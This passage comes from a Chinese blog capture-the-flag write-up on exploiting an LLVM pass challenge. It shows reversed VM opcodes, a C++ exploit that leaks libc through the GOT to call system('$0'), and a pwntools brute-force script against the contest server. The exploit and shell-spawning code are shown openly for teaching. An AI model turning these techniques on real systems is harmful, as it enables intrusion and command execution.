<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff1fa362e &lt;(anonymous namespace)::c0oo0o0Ode::isValidOp(llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction, false, false, void&gt;, false, true&gt;&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;)+158&gt;    call   llvm::operator==(llvm::StringRef, llvm::StringRef)@plt                &lt;llvm::operator==(llvm::StringRef, llvm::StringRef)@plt&gt;</span><br><span class="line">        rdi: 0x4e55e0 ◂— &#x27;_Z12testfunctionv&#x27;</span><br><span class="line">        rsi: 0x11</span><br><span class="line">        rdx: 0x4ce0c0 ◂— &#x27;_ZN4edoc4addiEhii&#x27;</span><br><span class="line">        rcx: 0x11</span><br></pre></td></tr></table></figure>

<p>同样，运行到每个<code>op</code>前的&#96;&#96;anonymous namespace’::c0oo0o0Ode::isValidOp&#96;函数记录每个函数的函数名，得到以下交互脚本</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addi</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> </span>&#123;&#125;  </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">chgr</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">int</span> y)</span> </span>&#123;&#125;                  </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">sftr</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">bool</span> y, <span class="type">unsigned</span> <span class="type">char</span> z)</span> </span>&#123;&#125;       </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">borr</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">char</span> y, <span class="type">unsigned</span> <span class="type">char</span> z)</span> </span>&#123;&#125; </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">movr</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">char</span> y)</span> </span>&#123;&#125;                 </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">int</span>  y)</span> </span>&#123;&#125;              </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">int</span> y)</span> </span>&#123;&#125;              </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">runc</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">int</span>  y)</span> </span>&#123;&#125;                </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">edoc obj;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">c0deVmMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>对每个功能进行逆向分析，分析过程不多描述，分析结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">addi -&gt; regs[x] = y + z                                			   ;x &lt;= 5</span><br><span class="line">chgr -&gt; regs[x] += y                                 			   ;x &lt;= 5                  -0x1000 &lt; y &lt; 0x1000    onetime</span><br><span class="line">sftr -&gt; if y == 1 : regs[x] &lt;&lt; z, if y == 0 : regs[x] &gt;&gt; z   	   ;x &lt;= 5  y &lt; 0x40</span><br><span class="line">borr -&gt; regs[x] = regs[y] | regs[z]                     		   ;x &lt;= 5  y &lt;= 5  z &lt;= 5</span><br><span class="line">movr -&gt; regs[x] = regs[y]                               		   ;x &lt; 8  y &lt; 8</span><br><span class="line">save -&gt; *(y+regs[6]) = regs[x]                          		   ;x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span><br><span class="line">load -&gt; regs[x] = *(y+regs[6])                          		   ;x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span><br><span class="line">runc -&gt; *(y+regs[6])(regs[x])                           		   ;x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span><br></pre></td></tr></table></figure>

<p>利用思路就是用<code>op7</code>获取一个<code>libc</code>上的地址，用<code>op8</code>执行<code>system(&#39;$0&#39;)</code>，<code>opt-12</code>程序没有开启<code>pie</code>，所以可以直接获取<code>opt-12</code>中的<code>got</code>表里的<code>libc</code>地址，离<code>system</code>最近的就是<code>0x442ad8</code>中的<code>getenv_got</code>，再通过左移右移或运算得到<code>system</code>地址，本地<code>getenv</code>和<code>system</code>地址如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/gx 0x442ad8</span></span><br><span class="line">0x442ad8 &lt;getenv@got[plt]&gt;:	0x00007ffff1c44b70</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p system</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7ffff1c50d70 &lt;system&gt;</span></span><br></pre></td></tr></table></figure>

<p>我的思路是将<code>getenv</code>右移<code>16</code>位再左移<code>16</code>位清空最后两个字节为<code>0x00007ffff1c40000</code>，第五位使用<code>op2</code>来加<code>1</code>为<code>0x00007ffff1c50000</code>，再用<code>op3</code>改末三位为<code>0x00007ffff1c50d70</code>，由于<code>libc</code>只有末三位固定剩下是随机的，所以第四位需要爆破</p>
<p>exp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addi</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> </span>&#123;&#125;                                 </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">chgr</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">int</span> y)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">sftr</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">bool</span> y, <span class="type">unsigned</span> <span class="type">char</span> z)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">borr</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">char</span> y, <span class="type">unsigned</span> <span class="type">char</span> z)</span> </span>&#123;&#125; </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">movr</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">char</span> y)</span> </span>&#123;&#125; </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">int</span>  y)</span> </span>&#123;&#125; </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">int</span> y)</span> </span>&#123;&#125; </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">runc</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> x, <span class="type">unsigned</span> <span class="type">int</span>  y)</span> </span>&#123;&#125;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">edoc obj;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testfunction</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">c0deVmMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        obj.<span class="built_in">addi</span>(<span class="number">0</span>, <span class="number">0x442000</span>, <span class="number">0</span>);</span><br><span class="line">        obj.<span class="built_in">movr</span>(<span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">        obj.<span class="built_in">addi</span>(<span class="number">1</span>, <span class="number">0x443000</span>, <span class="number">0</span>);		</span><br><span class="line">        obj.<span class="built_in">movr</span>(<span class="number">7</span>, <span class="number">1</span>);					<span class="comment">//regs[7] = regs[6] + 0x1000</span></span><br><span class="line">        obj.<span class="built_in">load</span>(<span class="number">2</span>, <span class="number">0xad8</span>);    			<span class="comment">//load(0x4420xad8): regs[2] = getenv_addr</span></span><br><span class="line"></span><br><span class="line">        obj.<span class="built_in">sftr</span>(<span class="number">2</span>, <span class="number">0</span>, <span class="number">16</span>);                     </span><br><span class="line">        obj.<span class="built_in">sftr</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">12</span>);</span><br><span class="line">        obj.<span class="built_in">addi</span>(<span class="number">5</span>, <span class="number">0x400</span>, <span class="number">0</span>);</span><br><span class="line">        obj.<span class="built_in">borr</span>(<span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">        obj.<span class="built_in">chgr</span>(<span class="number">2</span>, <span class="number">0xc00</span>);</span><br><span class="line">        obj.<span class="built_in">sftr</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>);				<span class="comment">//Sets the lower two bytes to null and increments the third last byte by 1</span></span><br><span class="line">        obj.<span class="built_in">addi</span>(<span class="number">4</span>, <span class="number">0xd70</span>, <span class="number">0</span>);</span><br><span class="line">        obj.<span class="built_in">borr</span>(<span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>);				<span class="comment">//clear and add</span></span><br><span class="line">    </span><br><span class="line">        obj.<span class="built_in">addi</span>(<span class="number">4</span>, <span class="number">0x3024</span>, <span class="number">0</span>);</span><br><span class="line">        obj.<span class="built_in">save</span>(<span class="number">4</span>, <span class="number">0x1000</span>);			<span class="comment">//save $0</span></span><br><span class="line"></span><br><span class="line">        obj.<span class="built_in">save</span>(<span class="number">2</span>, <span class="number">0xb00</span>);				<span class="comment">//save system</span></span><br><span class="line"></span><br><span class="line">        obj.<span class="built_in">runc</span>(<span class="number">1</span>, <span class="number">0xb00</span>);				<span class="comment">//system(&#x27;$0&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>爆破脚本，大概30+次爆破出来的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;exp.ll&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    p = base64.b64encode(file.read())</span><br><span class="line">p += <span class="string">b&#x27;\nEOF\n&#x27;</span></span><br><span class="line"></span><br><span class="line">rnd = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = remote(<span class="string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="number">43319</span>)</span><br><span class="line">        rnd += <span class="number">1</span></span><br><span class="line">        li(<span class="string">&#x27;the &#x27;</span> + <span class="built_in">str</span>(rnd) + <span class="string">&#x27; round&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;(EOF to stop):\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        r.send(p)</span><br><span class="line"></span><br><span class="line">        r.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s = r.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;YLCTF&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">            li(s)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://www.z1r0.top/2022/10/28/LLVM-PASS-PWN/">https://www.z1r0.top/2022/10/28/LLVM-PASS-PWN/</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>viol1t</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://viol1t.com/2024/10/31/LLVM-PASS-PWN%EF%BC%9A%E4%BD%BF%E7%94%A8c-%E7%BC%96%E5%86%99exp/">https://viol1t.com/2024/10/31/LLVM-PASS-PWN%EF%BC%9A%E4%BD%BF%E7%94%A8c-%E7%BC%96%E5%86%99exp/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2023 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/pwn/"># pwn</a>
                    
                        <a href="/tags/llvm/"># llvm</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2024/11/01/%E4%B8%80%E7%A7%8D%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8/">一种关于格式化字符串的新利用</a>
            
            
            <a class="next" rel="next" href="/2024/10/21/%E6%B5%85%E6%9E%90%E6%96%B0%E6%97%B6%E4%BB%A3%E7%9A%84wasm%E9%80%86%E5%90%91%E6%80%9D%E8%B7%AF-%E7%94%B1%E6%BA%90%E9%B2%81%E6%9D%AF%E5%85%A5%E9%97%A8%E9%A2%98%E5%92%8CN1junior%E9%9B%B6%E8%A7%A3%E9%A2%98%E5%BC%80%E5%A7%8B/">浅析新时代的wasm逆向思路-由源鲁杯入门题和N1junior零解题开始</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© viol1t | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>